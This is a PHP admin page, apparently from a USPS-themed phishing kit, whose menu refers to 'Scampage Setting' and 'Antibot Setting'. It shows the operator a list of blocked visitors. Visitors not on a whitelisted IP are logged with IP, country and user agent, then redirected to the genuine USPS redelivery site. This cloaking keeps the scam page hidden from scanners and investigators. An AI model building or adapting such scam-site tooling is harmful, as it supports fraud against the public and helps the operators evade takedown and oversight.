<?php
function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ini_array = parse_ini_file("setting.ini");

$IP = strval($ini_array['WhitelistedIp']);
$ipssss = ipp();
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ipssss));
$country = $ipdat->geoplugin_countryCode;
if ($IP == $ipssss){
    error_reporting(0);
    session_start();
    if(!isset($_SESSION['email_admin'])) {
        header("location: login.php");
    }
    function count_c($filename) {
        $total_click = 0;
        $handle = fopen($filename, "r");
        $string = file_get_contents($filename);
        if(strlen($string) == 0){
            $total_click = 0;
        }else{
            while(!feof($handle)){
                $line = fgets($handle);
                $total_click++;
            }
        }   
        return $total_click;
        fclose($handle);
    }
    $BlockCountry = count_c("../result/total_Blocked.txt");
}else{
    $os = $_SERVER['HTTP_USER_AGENT'];
    $countryy = $ipdat->geoplugin_countryName;
    $click = fopen("../result/total_Blocked.txt","a");
    fwrite($click,"$ipssss|$country|$os"."\n");
    fclose($click);
    header("Location: https://tools.usps.com/redelivery.htm");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <title>ECHO - Admin Panel</title>
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <h3>ECHO</h3>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="active has-sub">
                            <a href="index.php">
                            <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <!--<li>
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>-->
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li>
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Blocked Access</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <h3>ECHO</h3>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li>
                            <a href="index.php">
                                <i class="fas fa-tachometer-alt"></i>Statistic</a>
                           
                        </li>
                        <!--<li>
                            <a href="setting.php">
                                <i class="fas fa-cog"></i>Scampage Setting</a>
                        </li>
                        <li>
                            <a href="antibot.php">
                                <i class="fas fa-cog"></i>Antibot Setting</a>
                        </li>-->
                        <li>
                            <a href="visitor.php">
                                <i class="fas fa-list"></i>List Visitor</a>
                        </li>
                        <li class="active has-sub">
                            <a href="bot.php">
                                <i class="fas fa-bug"></i>Blocked Access</a>
                        </li>
                        <li>
                            <a href="reset.php">
                                <i class="fas fa-trash"></i>Reset Statistic</a>
                        </li>
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                       
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            
                            <div class="header-button">
                                <div class="noti-wrap">
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        
                        
                        <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">Blocked access (<?php echo $BlockCountry;?>)</h2>
                                <div class="table--no-card m-b-40" style="max-height: 1000px;overflow:scroll;">
                                    <table class="table table-borderless table-striped table-earning">
                                        <thead>
                                            <tr>
                                                <th>IP Address</th>
                                                <th>Country</th>
                                                <th>OS</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            if(file_exists("../result/total_Blocked.txt")){
                                            $bin = file_get_contents("../result/total_Blocked.txt");
                                            $bin = explode("\n", $bin);
                                         
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $ip = $bins[0];
                                                $ipdat = @json_decode(file_get_contents(
                                                    "http://www.geoplugin.net/json.gp?ip=" . $ip));
                                                $code = $ipdat->geoplugin_countryCode;
                                                $detect = $bins[1];
                                                $os = $bins[2];
                                                
                                                if($ip == "") {

                                                }else{
                                                echo "<tr>
                                                <td><img style='border-width: 8px; width: 30px;' src='https://flagicons.lipis.dev/flags/1x1/".strtolower($code).".svg'> ".$ip."</td>
                                                <td>".$detect."</td>
                                                <td>".$os."</td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td></tr>";
                                            }
                                            ?>
                                        
                                            
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                        
                        <div class="row">
                            <div class="col-md-12">
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->
